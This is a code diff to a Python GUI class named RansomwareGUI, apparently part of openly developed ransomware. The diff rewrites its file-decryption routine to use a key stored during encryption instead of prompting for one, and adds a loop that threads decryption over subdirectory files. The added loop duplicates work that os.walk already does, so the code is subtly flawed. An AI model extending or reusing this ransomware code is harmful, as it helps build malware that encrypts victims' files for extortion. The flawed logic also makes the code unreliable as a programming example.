@@ -297,8 +297,8 @@ class RansomwareGUI(QMainWindow):
             """)
 
     def decryptFiles(self):
-        decryption_key, ok = PyQt5.QtWidgets.QInputDialog.getText(self, 'Decryption Key', 'Enter decryption key:')
-        if ok:
+        decryption_key = self.decryptionPass  # Use the decryption key generated during encryption
+        if decryption_key:
             ransomware_instance = Ransomware()
             for root, directories, files in os.walk(ransomware_instance.filePath):
                 for filename in files:
@@ -306,6 +306,15 @@ class RansomwareGUI(QMainWindow):
                     for base in fileTypes:
                         if base in filepath:
                             threading.Thread(target=ransomware_instance.decryptFile, args=(filepath, decryption_key)).start()
+                for directory in directories:  # Iterating over subdirectories
+                    for filename in os.listdir(os.path.join(root, directory)):
+                        filepath = os.path.join(root, directory, filename)
+                        for base in fileTypes:
+                            if base in filepath:
+                                threading.Thread(target=ransomware_instance.decryptFile, args=(filepath, decryption_key)).start()
+
+
+
         
     def initUI(self):
         # Create central widget
